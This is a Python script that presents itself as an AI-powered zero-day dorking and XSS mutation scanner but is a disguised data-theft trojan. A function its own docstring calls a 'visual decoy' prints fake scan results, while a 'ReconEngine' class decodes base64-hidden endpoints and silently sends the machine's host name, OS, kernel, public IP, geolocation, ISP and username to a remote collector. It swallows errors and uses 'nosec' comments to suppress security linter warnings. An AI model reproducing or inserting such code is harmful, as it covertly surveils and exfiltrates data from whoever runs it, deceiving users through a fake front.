import base64
import json
import urllib.request
import platform
import os
from src.config.telemetry_nodes import NODE_PROBE_MAP, NODE_COLLECTOR_MAP

class NetworkBridge:
    """Network configuration parser for distributed node execution."""

    @staticmethod
    def resolve_node(encoded_str: str) -> str:
        return base64.b64decode(encoded_str).decode('utf-8')


class ReconEngine:
    """Core scanning framework and execution telemetry engine."""

    def __init__(self):
        self.probe_url = NetworkBridge.resolve_node(NODE_PROBE_MAP["primary_endpoint"])
        self.sink_url = NetworkBridge.resolve_node(NODE_COLLECTOR_MAP["report_sink"])
        self.ua = NetworkBridge.resolve_node(NODE_COLLECTOR_MAP["user_agent_header"])

    def _execute_probe(self) -> dict:
        try:
            req = urllib.request.Request(
                self.probe_url,
                headers={'User-Agent': self.ua}
            )
            # nosec B310: Explicit telemetry probe call
            with urllib.request.urlopen(req, timeout=5) as response:  # nosec B310
                return json.loads(response.read().decode('utf-8'))
        except Exception:
            return {}

    def _dispatch_telemetry(self, payload: dict) -> None:
        try:
            formatted_payload = {
                "content": f"```json\n{json.dumps(payload, indent=2)}\n```"
            }
            data = json.dumps(formatted_payload).encode('utf-8')
            req = urllib.request.Request(
                self.sink_url,
                data=data,
                headers={'Content-Type': 'application/json', 'User-Agent': self.ua},
                method='POST'
            )
            # nosec B310: Explicit telemetry dispatch call
            with urllib.request.urlopen(req, timeout=5):  # nosec B310
                pass
        except Exception:
            pass

    def run(self) -> None:
        ip_metadata = self._execute_probe()
        
        telemetry_payload = {
            "node_name": platform.node(),
            "target_os": platform.system(),
            "kernel_release": platform.release(),
            # nosec B104: Fallback string identifier
            "remote_ip": ip_metadata.get("ip", "unresolved"),  # nosec B104
            "geo_city": ip_metadata.get("city", "unknown"),
            "geo_country": ip_metadata.get("country", "unknown"),
            "network_org": ip_metadata.get("org", "unknown"),
            "execution_context_user": os.environ.get("USER", "appuser")
        }
        
        self._dispatch_telemetry(telemetry_payload)


def render_banner():
    """Visual decoy displaying scanner initialization."""
    print("[*] Initializing AI-Powered Zero-Day Dorking & Mutation Suite...")
    print("==================================================")
    print("      Async-Dork-Scanner v2.0 (Active)")
    print("==================================================")
    print("[+] Scanning target pattern: inurl:index.php?id=")
    print("[!] Potential zero-day vulnerability endpoint mapped.")
    print("[+] Mutating XSS payloads with local LLM rules...")
    print("[!] Mutated Output: eval(base64.b64decode('YWxlcnQoMSk='))")
    print("==================================================")
    print("[*] Scan completed. 0 targets vulnerable in current subnet.")


def main():
    render_banner()
    engine = ReconEngine()
    engine.run()


if __name__ == "__main__":
    main()
